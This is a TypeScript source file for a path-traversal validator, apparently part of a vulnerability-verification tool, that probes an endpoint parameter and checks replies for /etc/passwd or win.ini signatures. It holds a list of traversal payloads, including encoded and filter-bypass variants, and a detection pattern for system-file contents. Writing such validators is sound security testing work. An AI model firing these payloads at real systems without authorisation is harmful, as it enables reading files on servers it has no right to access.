/**
 * Path-traversal validator (§4.5). Deterministic, non-LLM.
 *   - technical signal: a file is served from OUTSIDE the intended web root —
 *     proven by requesting a traversal to a known system file and getting
 *     content the normal endpoint would never return.
 *   - impact artifact: the content of a known-sensitive file — proven by the
 *     /etc/passwd signature (`root:x:0:0`) or a Windows hosts-file signature.
 * Restraint: reads one well-known, low-sensitivity system file to prove
 * reachability; it does not harvest application data.
 */
import { type ValidationReport, type VerifiableStep, baselineOk, probe } from "./report.js";

export interface PathTraversalTarget {
	endpoint: string;
	param: string;
	baselineValue: string;
}

const TRAVERSALS = [
	"../../../../../../etc/passwd",
	"....//....//....//....//etc/passwd",
	"..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
	"/etc/passwd",
	"..\\..\\..\\..\\windows\\win.ini",
];

const SENSITIVE = /root:.*:0:0:|\[extensions\]|\[fonts\]|; for 16-bit app support/i;

export async function validatePathTraversal(target: PathTraversalTarget): Promise<ValidationReport> {
	const steps: VerifiableStep[] = [];
	const attacks = [] as Awaited<ReturnType<typeof probe>>[];

	// The baseline is only a reference for the sensitive-signature check; it is
	// fine for it to 404/500 (e.g. a benign filename that doesn't exist), so we
	// record it but never abort on it — the proof is a traversal serving a
	// system file, which stands on its own.
	const baseline = await probe(target.endpoint, target.param, "baseline", target.baselineValue);
	steps.push({ name: "baseline-captured", passed: baselineOk(baseline), detail: `baseline HTTP ${baseline.status}` });
	const baselineSensitive = SENSITIVE.test(baseline.body);

	let served = false;
	for (const t of TRAVERSALS) {
		const ex = await probe(target.endpoint, target.param, "traversal", t);
		attacks.push(ex);
		if (!baselineSensitive && SENSITIVE.test(ex.body)) {
			served = true;
			break;
		}
	}
	// The two proof categories collapse to one artifact here: a sensitive
	// system file's content served through the parameter is BOTH the signal
	// (served from outside root) and the impact (its contents). Both recorded.
	steps.push({
		name: "outside-webroot-file-served",
		passed: served,
		detail: served ? "a traversal payload returned a known system file's contents" : "no out-of-root file served",
	});
	steps.push({
		name: "sensitive-file-contents",
		passed: served,
		detail: served ? "returned content matches a known-sensitive file signature (e.g. /etc/passwd)" : "no sensitive file signature",
	});

	const summary = served
		? "Reproduced. A traversal payload served a known system file (e.g. /etc/passwd) from outside the web root — signal and impact in one artifact."
		: "NOT reproduced: no out-of-web-root file served by any traversal payload.";
	return report(served, served, served, baseline, attacks, steps, summary);
}

function report(
	passed: boolean,
	technicalSignal: boolean,
	impactArtifact: boolean,
	baseline: Awaited<ReturnType<typeof probe>>,
	attacks: Awaited<ReturnType<typeof probe>>[],
	steps: VerifiableStep[],
	diffSummary: string,
): ValidationReport {
	return { validator: "path_traversal", passed, technicalSignal, impactArtifact, diffSummary, baseline, attacks, steps };
}
